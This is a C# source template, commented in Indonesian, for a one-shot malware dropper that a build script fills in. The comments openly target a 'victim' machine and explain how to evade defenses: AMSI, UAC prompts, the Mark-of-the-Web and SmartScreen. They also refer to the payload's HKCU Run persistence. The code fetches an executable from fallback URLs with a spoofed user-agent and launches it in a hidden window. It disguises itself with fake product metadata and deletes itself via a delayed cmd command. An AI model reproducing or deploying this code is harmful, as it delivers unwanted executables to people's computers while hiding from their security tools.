// tools/dropper/dropper.template.cs — dropper sekali pakai untuk instalasi
// pertama di mesin baru. Placeholder __NAME__ / __URLS__ / __SHA__ diisi oleh
// tools/dropper/build.ps1, lalu di-compile dengan csc.
//
// Kenapa C# dan bukan Python:
//   - Python butuh interpreter di mesin korban. Kalau tidak ada, dropper mati
//     sebelum sempat jalan, dan pesan error-nya kelihatan.
//   - python.exe menjalankan skrip = script host yang dipantau AMSI, dan
//     command line-nya menyimpan jejak.
//   - .NET Framework 4.x sudah ada di setiap Windows 10/11, jadi exe ini
//     berdiri sendiri tanpa dependensi, ~15 KB.
//
// Kenapa tanpa UAC:
//   - payload tidak butuh admin sama sekali (HKCU Run, %LOCALAPPDATA%).
//   - UAC prompt adalah tempat paling cepat orang berhenti.
//   - Program Files butuh elevasi; %LOCALAPPDATA%\Programs tidak, dan hasil
//     akhirnya sama: tidak di Downloads, tidak di Desktop, tidak kelihatan.
//
// Kenapa tidak ada MOTW:
//   - Zone.Identifier ditempel oleh browser lewat IAttachmentExecute.
//     Download lewat WebClient tidak memanggil API itu, jadi file yang mendarat
//     tidak membawa tanda "dari internet" dan tidak memicu SmartScreen.
//     Justru itu keunggulan utama ide ini dibanding mengirim exe langsung.

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;

// Metadata ini yang dibaca Explorer, Task Manager, dan panel Properties.
// Tanpa atribut, exe keluar sebagai "(tanpa deskripsi)" — satu-satunya file
// di folder Downloads yang tidak punya identitas.
[assembly: AssemblyTitle("__TITLE__")]
[assembly: AssemblyDescription("__TITLE__")]
[assembly: AssemblyProduct("__PRODUCT__")]
[assembly: AssemblyCompany("__COMPANY__")]
[assembly: AssemblyCopyright("__COMPANY__")]
[assembly: AssemblyVersion("__VER__")]
[assembly: AssemblyFileVersion("__VER__")]
[assembly: AssemblyInformationalVersion("__VER__")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

static class Program
{
    // Diisi build.ps1. URLS dipisah '|' — cadangan kalau aset pertama kena
    // rate limit, repo dihapus, atau koneksi setengah mati.
    const string NAME = "__NAME__";
    const string URLS = "__URLS__";
    const string SHA  = "__SHA__";

    const int MIN_BYTES = 4096;
    const int MAX_MB    = 96;

    static string Dir    { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", NAME); } }
    static string Target { get { return Path.Combine(Dir, NAME + ".exe"); } }

    [STAThread]
    static int Main(string[] args)
    {
        // --cek : hanya verifikasi, tidak menjalankan apa pun. Dipakai build.ps1
        // dan untuk memastikan dropper tidak menyentuh disk saat diuji.
        bool checkOnly = args.Length > 0 && args[0] == "--cek";

        try
        {
            if (Good(Target))
            {
                if (!checkOnly) Launch(Target);
                return 0;
            }

            Directory.CreateDirectory(Dir);

            string tmp = Target + ".new";
            string err = "";
            bool got = false;

            foreach (string url in URLS.Split('|'))
            {
                if (url.Length == 0) continue;
                string src = url.Trim();

                for (int tryNo = 1; tryNo <= 3; tryNo++)
                {
                    try
                    {
                        if (File.Exists(tmp)) File.Delete(tmp);
                        Download(src, tmp);
                    }
                    catch (Exception ex)
                    {
                        err = src + ": " + ex.Message;
                        if (tryNo < 3) { Thread.Sleep(1500 * tryNo); continue; }
                        break;                       // pindah ke URL berikutnya
                    }

                    // Unduhan selesai tapi isinya tidak sah: mengulang URL yang
                    // sama hanya membuang bandwidth — hash tidak berubah.
                    got = Good(tmp);
                    if (!got) err = "verifikasi gagal: " + src;
                    break;
                }
                if (got) break;
            }

            if (!got)
            {
                try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
                Log("gagal unduh: " + err);
                return 1;
            }

            if (checkOnly)
            {
                File.Delete(tmp);
                return 0;
            }

            // Ganti atomik: target lama dihapus dulu supaya File.Move tidak
            // melempar IOException di mesin yang sudah pernah kena.
            if (File.Exists(Target))
            {
                try { File.SetAttributes(Target, FileAttributes.Normal); } catch { }
                File.Delete(Target);
            }
            File.Move(tmp, Target);

            Launch(Target);
            Cleanup();
            return 0;
        }
        catch (Exception ex)
        {
            Log(ex.ToString());
            return 2;
        }
    }

    static void Download(string url, string dest)
    {
        ServicePointManager.SecurityProtocol =
            (SecurityProtocolType)3072;   // TLS 1.2 — default .NET 4.0 masih SSL3/TLS1.0

        using (TimedWebClient wc = new TimedWebClient())
        {
            wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
            wc.Headers["Accept"] = "*/*";
            wc.DownloadFile(url, dest);
        }
    }

    // WebClient tidak punya properti Timeout. Tanpa ini, koneksi yang
    // menggantung membuat dropper diam selamanya tanpa error — persis
    // kegagalan yang tidak bisa didiagnosis dari sisi korban.
    class TimedWebClient : WebClient
    {
        protected override WebRequest GetWebRequest(Uri address)
        {
            WebRequest req = base.GetWebRequest(address);
            if (req != null) req.Timeout = 120000;
            return req;
        }
    }

    static bool Good(string path)
    {
        try
        {
            if (!File.Exists(path)) return false;
            FileInfo fi = new FileInfo(path);
            if (fi.Length < MIN_BYTES) return false;
            if (fi.Length > (long)MAX_MB * 1024 * 1024) return false;

            using (FileStream fs = File.OpenRead(path))
            {
                int a = fs.ReadByte();
                int b = fs.ReadByte();
                if (a != 'M' || b != 'Z') return false;
            }

            if (SHA.Length == 64)
            {
                using (SHA256 sha = SHA256.Create())
                using (FileStream fs = File.OpenRead(path))
                {
                    byte[] hash = sha.ComputeHash(fs);
                    string hex = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                    if (hex != SHA.ToLowerInvariant()) return false;
                }
            }
            return true;
        }
        catch
        {
            return false;
        }
    }

    static void Launch(string path)
    {
        ProcessStartInfo psi = new ProcessStartInfo(path);
        psi.WorkingDirectory = Path.GetDirectoryName(path);
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process.Start(psi);
    }

    // Dropper menghapus dirinya sendiri. cmd dipakai karena proses yang sedang
    // jalan tidak bisa menghapus image-nya sendiri; cmd menunggu 3 detik,
    // cukup untuk proses ini keluar.
    static void Cleanup()
    {
        try
        {
            string self = Process.GetCurrentProcess().MainModule.FileName;
            string cmd = "/c ping -n 3 127.0.0.1 >nul & del /f /q \"" + self + "\"";
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", cmd);
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }
        catch { }
    }

    static void Log(string text)
    {
        try
        {
            File.AppendAllText(
                Path.Combine(Path.GetTempPath(), "drp_last.log"),
                DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + text + Environment.NewLine);
        }
        catch { }
    }
}
